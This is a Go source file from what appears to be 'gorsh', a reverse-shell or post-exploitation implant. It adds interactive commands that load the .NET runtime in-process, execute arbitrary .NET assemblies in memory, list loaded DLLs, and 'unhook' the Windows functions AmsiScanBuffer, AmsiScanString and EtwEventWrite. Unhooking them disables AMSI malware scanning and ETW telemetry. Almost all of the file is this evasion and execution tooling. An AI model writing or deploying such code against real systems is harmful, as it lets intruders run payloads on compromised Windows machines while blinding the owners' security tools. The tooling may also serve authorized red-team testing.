package cmds

import (
	"encoding/json"
	"fmt"
	"io"
	"strings"

	"git.hyrule.link/blink/gorsh/pkg/execute_assembly"

	"github.com/abiosoft/ishell"
)

var clr = execute_assembly.CLR{}

func UnloadAssembly(c *ishell.Context) {
	clr.Active = ""
	ResetPrompt(c)
}

func LoadAssembly(c *ishell.Context) {
	if len(c.Args) == 0 {
		assys := c.Cmd.Completer([]string{})
		for _, assy := range assys {
			c.Println(assy)
		}
		return
	}

	name := c.Args[0]
	var err error

	if !clr.IsLoaded() {
		clr, err = execute_assembly.NewCLR()
		//BUG: need to load twice. First load gets error, but works
		// this is just a ui workaronud so you don't need to run
		// the load command twice
		clr, err = clr.LoadCLR()
		if err != nil {
			c.Printf("could not load clr: %v\n", err)
			return
		}
	}

	err = clr.Load(name)
	if err != nil {
		c.Printf("could not load %s: %s\n", name, err)
		return
	}

	ChangePrompt(c, name)
}

func ExecuteAssembly(c *ishell.Context) {
	if clr.Active == "" {
		c.Println("no assembly is currently loaded")
		return
	}
	stdout, stderr := clr.Execute(c.Args)
	c.Println(stdout)
	c.Println(stderr)
}

func ResetPrompt(c *ishell.Context) {
	c.SetPrompt(fmt.Sprintf("[%s]> ", GetHostname()))
}

func ChangePrompt(c *ishell.Context, module string) {
	c.SetPrompt(fmt.Sprintf("[%s] %s > ", GetHostname(), module))
}

func ListDlls(c *ishell.Context) {
	dlls, err := execute_assembly.ListDll()
	if err != nil {
		c.Println(err)
		return
	}

	for _, dll := range dlls {
		c.Println(dll)
	}
}

func Unhook(c *ishell.Context) {

	defs := make(map[string][]string)
	defs["1"] = []string{
		"amsi.AmsiScanBuffer",
		"amsi.AmsiScanString",
	}

	defs["2"] = []string{
		"ntdll.EtwEventWrite",
	}

	if len(c.Args) == 0 {
		c.Println("Choices:\n")
		b, _ := json.MarshalIndent(defs, "", " ")
		c.Println(string(b))
		c.Println("\nOr 'modname.procname'")
		return
	}

	unhook := unhooker(c)

	// predifined choice
	choice := defs[c.Args[0]]
	if choice != nil {
		for _, fn := range choice {
			res, err := unhook(fn)
			c.Println(res)
			c.Println(err)
		}
	} else {
		// one-off unhook
		res, err := unhook(c.Args[0])
		c.Println(res)
		c.Println(err)
	}
}

func unhooker(c *ishell.Context) func(string) (string, error) {

	return func(modFn string) (res string, err error) {
		arg := strings.Split(modFn, ".")
		if len(arg) != 2 {
			err = fmt.Errorf("invalid input: mod.Proc")
			return
		}

		dllName := fmt.Sprintf("%s.dll", arg[0])
		dll, err := execute_assembly.UnhookFunction(dllName, arg[1])
		if err == io.EOF {
			res = "nothing to unhook"
			return
		}
		if err != nil {
			err = fmt.Errorf("failed to unhook %s: %v\n", modFn, err)
			return
		}
		res = fmt.Sprintf(
			"unhooked %s at : 0x%08x + 0x%04x = 0x%08x\n",
			modFn, dll.DllBaseAddr, dll.FuncOffset, dll.FuncAddress,
		)
		return
	}

}
